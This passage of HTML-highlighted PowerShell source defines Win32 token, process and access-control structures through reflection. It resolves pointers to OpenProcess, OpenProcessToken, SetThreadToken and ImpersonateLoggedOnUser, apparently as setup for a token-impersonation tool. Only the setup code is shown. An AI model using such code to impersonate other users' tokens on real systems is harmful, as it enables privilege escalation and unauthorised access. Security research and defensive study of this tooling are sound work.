punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'LogoffTime'</span><span class="token punctuation">,</span> <span class="token variable">$LARGE_INTEGER</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'KickOffTime'</span><span class="token punctuation">,</span> <span class="token variable">$LARGE_INTEGER</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'PasswordLastSet'</span><span class="token punctuation">,</span> <span class="token variable">$LARGE_INTEGER</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'PasswordCanChange'</span><span class="token punctuation">,</span> <span class="token variable">$LARGE_INTEGER</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'PasswordMustChange'</span><span class="token punctuation">,</span> <span class="token variable">$LARGE_INTEGER</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$SECURITY_LOGON_SESSION_DATA</span> = <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>CreateType<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#Struct STARTUPINFO</span>    <span class="token variable">$Attributes</span> = <span class="token string">'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'</span>    <span class="token variable">$TypeBuilder</span> = <span class="token variable">$ModuleBuilder</span><span class="token punctuation">.</span>DefineType<span class="token punctuation">(</span><span class="token string">'STARTUPINFO'</span><span class="token punctuation">,</span> <span class="token variable">$Attributes</span><span class="token punctuation">,</span> <span class="token namespace">[System.ValueType]</span><span class="token punctuation">)</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'cb'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'lpReserved'</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'lpDesktop'</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'lpTitle'</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'dwX'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'dwY'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'dwXSize'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'dwYSize'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'dwXCountChars'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'dwYCountChars'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'dwFillAttribute'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'dwFlags'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'wShowWindow'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt16]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'cbReserved2'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt16]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'lpReserved2'</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'hStdInput'</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'hStdOutput'</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'hStdError'</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$STARTUPINFO</span> = <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>CreateType<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#Struct PROCESS_INFORMATION</span>    <span class="token variable">$Attributes</span> = <span class="token string">'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'</span>    <span class="token variable">$TypeBuilder</span> = <span class="token variable">$ModuleBuilder</span><span class="token punctuation">.</span>DefineType<span class="token punctuation">(</span><span class="token string">'PROCESS_INFORMATION'</span><span class="token punctuation">,</span> <span class="token variable">$Attributes</span><span class="token punctuation">,</span> <span class="token namespace">[System.ValueType]</span><span class="token punctuation">)</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'hProcess'</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'hThread'</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'dwProcessId'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'dwThreadId'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$PROCESS_INFORMATION</span> = <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>CreateType<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#Struct TOKEN_ELEVATION</span>    <span class="token variable">$Attributes</span> = <span class="token string">'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'</span>    <span class="token variable">$TypeBuilder</span> = <span class="token variable">$ModuleBuilder</span><span class="token punctuation">.</span>DefineType<span class="token punctuation">(</span><span class="token string">'TOKEN_ELEVATION'</span><span class="token punctuation">,</span> <span class="token variable">$Attributes</span><span class="token punctuation">,</span> <span class="token namespace">[System.ValueType]</span><span class="token punctuation">)</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'TokenIsElevated'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TOKEN_ELEVATION</span> = <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>CreateType<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#Struct LUID_AND_ATTRIBUTES</span>    <span class="token variable">$Attributes</span> = <span class="token string">'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'</span>    <span class="token variable">$TypeBuilder</span> = <span class="token variable">$ModuleBuilder</span><span class="token punctuation">.</span>DefineType<span class="token punctuation">(</span><span class="token string">'LUID_AND_ATTRIBUTES'</span><span class="token punctuation">,</span> <span class="token variable">$Attributes</span><span class="token punctuation">,</span> <span class="token namespace">[System.ValueType]</span><span class="token punctuation">,</span> 12<span class="token punctuation">)</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'Luid'</span><span class="token punctuation">,</span> <span class="token variable">$LUID</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'Attributes'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$LUID_AND_ATTRIBUTES</span> = <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>CreateType<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#Struct TOKEN_PRIVILEGES</span>    <span class="token variable">$Attributes</span> = <span class="token string">'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'</span>    <span class="token variable">$TypeBuilder</span> = <span class="token variable">$ModuleBuilder</span><span class="token punctuation">.</span>DefineType<span class="token punctuation">(</span><span class="token string">'TOKEN_PRIVILEGES'</span><span class="token punctuation">,</span> <span class="token variable">$Attributes</span><span class="token punctuation">,</span> <span class="token namespace">[System.ValueType]</span><span class="token punctuation">,</span> 16<span class="token punctuation">)</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'PrivilegeCount'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'Privileges'</span><span class="token punctuation">,</span> <span class="token variable">$LUID_AND_ATTRIBUTES</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TOKEN_PRIVILEGES</span> = <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>CreateType<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#Struct ACE_HEADER</span>    <span class="token variable">$Attributes</span> = <span class="token string">'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'</span>    <span class="token variable">$TypeBuilder</span> = <span class="token variable">$ModuleBuilder</span><span class="token punctuation">.</span>DefineType<span class="token punctuation">(</span><span class="token string">'ACE_HEADER'</span><span class="token punctuation">,</span> <span class="token variable">$Attributes</span><span class="token punctuation">,</span> <span class="token namespace">[System.ValueType]</span><span class="token punctuation">)</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'AceType'</span><span class="token punctuation">,</span> <span class="token namespace">[Byte]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'AceFlags'</span><span class="token punctuation">,</span> <span class="token namespace">[Byte]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'AceSize'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt16]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$ACE_HEADER</span> = <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>CreateType<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#Struct ACL</span>    <span class="token variable">$Attributes</span> = <span class="token string">'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'</span>    <span class="token variable">$TypeBuilder</span> = <span class="token variable">$ModuleBuilder</span><span class="token punctuation">.</span>DefineType<span class="token punctuation">(</span><span class="token string">'ACL'</span><span class="token punctuation">,</span> <span class="token variable">$Attributes</span><span class="token punctuation">,</span> <span class="token namespace">[System.ValueType]</span><span class="token punctuation">)</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'AclRevision'</span><span class="token punctuation">,</span> <span class="token namespace">[Byte]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'Sbz1'</span><span class="token punctuation">,</span> <span class="token namespace">[Byte]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'AclSize'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt16]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'AceCount'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt16]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'Sbz2'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt16]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$ACL</span> = <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>CreateType<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#Struct ACE_HEADER</span>    <span class="token variable">$Attributes</span> = <span class="token string">'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'</span>    <span class="token variable">$TypeBuilder</span> = <span class="token variable">$ModuleBuilder</span><span class="token punctuation">.</span>DefineType<span class="token punctuation">(</span><span class="token string">'ACCESS_ALLOWED_ACE'</span><span class="token punctuation">,</span> <span class="token variable">$Attributes</span><span class="token punctuation">,</span> <span class="token namespace">[System.ValueType]</span><span class="token punctuation">)</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'Header'</span><span class="token punctuation">,</span> <span class="token variable">$ACE_HEADER</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'Mask'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'SidStart'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$ACCESS_ALLOWED_ACE</span> = <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>CreateType<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#Struct TRUSTEE</span>    <span class="token variable">$Attributes</span> = <span class="token string">'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'</span>    <span class="token variable">$TypeBuilder</span> = <span class="token variable">$ModuleBuilder</span><span class="token punctuation">.</span>DefineType<span class="token punctuation">(</span><span class="token string">'TRUSTEE'</span><span class="token punctuation">,</span> <span class="token variable">$Attributes</span><span class="token punctuation">,</span> <span class="token namespace">[System.ValueType]</span><span class="token punctuation">)</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'pMultipleTrustee'</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'MultipleTrusteeOperation'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'TrusteeForm'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'TrusteeType'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'ptstrName'</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TRUSTEE</span> = <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>CreateType<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#Struct EXPLICIT_ACCESS</span>    <span class="token variable">$Attributes</span> = <span class="token string">'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'</span>    <span class="token variable">$TypeBuilder</span> = <span class="token variable">$ModuleBuilder</span><span class="token punctuation">.</span>DefineType<span class="token punctuation">(</span><span class="token string">'EXPLICIT_ACCESS'</span><span class="token punctuation">,</span> <span class="token variable">$Attributes</span><span class="token punctuation">,</span> <span class="token namespace">[System.ValueType]</span><span class="token punctuation">)</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'grfAccessPermissions'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'grfAccessMode'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'grfInheritance'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'Trustee'</span><span class="token punctuation">,</span> <span class="token variable">$TRUSTEE</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token variable">$EXPLICIT_ACCESS</span> = <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>CreateType<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">###############################</span>    <span class="token comment" spellcheck="true">###############################</span>    <span class="token comment" spellcheck="true">#Win32Functions</span>    <span class="token comment" spellcheck="true">###############################</span>    <span class="token variable">$OpenProcessAddr</span> = Get<span class="token operator">-</span>ProcAddress kernel32<span class="token punctuation">.</span>dll OpenProcess    <span class="token variable">$OpenProcessDelegate</span> = Get<span class="token operator">-</span>DelegateType @<span class="token punctuation">(</span><span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token namespace">[Bool]</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token namespace">[IntPtr]</span><span class="token punctuation">)</span>    <span class="token variable">$OpenProcess</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetDelegateForFunctionPointer<span class="token punctuation">(</span><span class="token variable">$OpenProcessAddr</span><span class="token punctuation">,</span> <span class="token variable">$OpenProcessDelegate</span><span class="token punctuation">)</span>    <span class="token variable">$OpenProcessTokenAddr</span> = Get<span class="token operator">-</span>ProcAddress advapi32<span class="token punctuation">.</span>dll OpenProcessToken    <span class="token variable">$OpenProcessTokenDelegate</span> = Get<span class="token operator">-</span>DelegateType @<span class="token punctuation">(</span><span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">.</span>MakeByRefType<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token namespace">[Bool]</span><span class="token punctuation">)</span>    <span class="token variable">$OpenProcessToken</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetDelegateForFunctionPointer<span class="token punctuation">(</span><span class="token variable">$OpenProcessTokenAddr</span><span class="token punctuation">,</span> <span class="token variable">$OpenProcessTokenDelegate</span><span class="token punctuation">)</span>        <span class="token variable">$GetTokenInformationAddr</span> = Get<span class="token operator">-</span>ProcAddress advapi32<span class="token punctuation">.</span>dll GetTokenInformation    <span class="token variable">$GetTokenInformationDelegate</span> = Get<span class="token operator">-</span>DelegateType @<span class="token punctuation">(</span><span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token variable">$TOKEN_INFORMATION_CLASS</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">.</span>MakeByRefType<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token namespace">[Bool]</span><span class="token punctuation">)</span>    <span class="token variable">$GetTokenInformation</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetDelegateForFunctionPointer<span class="token punctuation">(</span><span class="token variable">$GetTokenInformationAddr</span><span class="token punctuation">,</span> <span class="token variable">$GetTokenInformationDelegate</span><span class="token punctuation">)</span>        <span class="token variable">$SetThreadTokenAddr</span> = Get<span class="token operator">-</span>ProcAddress advapi32<span class="token punctuation">.</span>dll SetThreadToken    <span class="token variable">$SetThreadTokenDelegate</span> = Get<span class="token operator">-</span>DelegateType @<span class="token punctuation">(</span><span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token namespace">[Bool]</span><span class="token punctuation">)</span>    <span class="token variable">$SetThreadToken</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetDelegateForFunctionPointer<span class="token punctuation">(</span><span class="token variable">$SetThreadTokenAddr</span><span class="token punctuation">,</span> <span class="token variable">$SetThreadTokenDelegate</span><span class="token punctuation">)</span>        <span class="token variable">$ImpersonateLoggedOnUserAddr</span> = Get<span class="token operator">-</span>ProcAddress advapi32<span class="token punctuation">.</span>dll ImpersonateLoggedOnUser    <span class="token variable">$ImpersonateLoggedOnUserDelegate</span> = Get<span class="token operator">-</span>DelegateType @<span class="token punctuation">(</span><span class="token namespace">[IntPtr]</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token namespace">[Bool]</span><span class="token punctuation">)</span>    <span class="token variable">$ImpersonateLoggedOnUser</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetDelegateForFunctionPointer<span class="token punctuation">(</span><span class="token variable">$ImpersonateLoggedOnUserAddr</span><span class="token punctuation">,</span> <span class="token variable">$ImpersonateLoggedOnUserDelegate</span><span class="token punctuation">)</span>    <span class="token variable">$RevertToSelfAddr</span> = Get<span class="token operator">-</span>ProcAddress advapi32<span class="token punctuation">.</span>dll RevertToSelf    <span class="token variable">$RevertToSelfDelegate</span> = Get<span class="token operator">-</span>DelegateType @<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token namespace">[Bool]</span><span class="token punctuation">)</span>    <span class="token variable">$RevertToSelf</span> 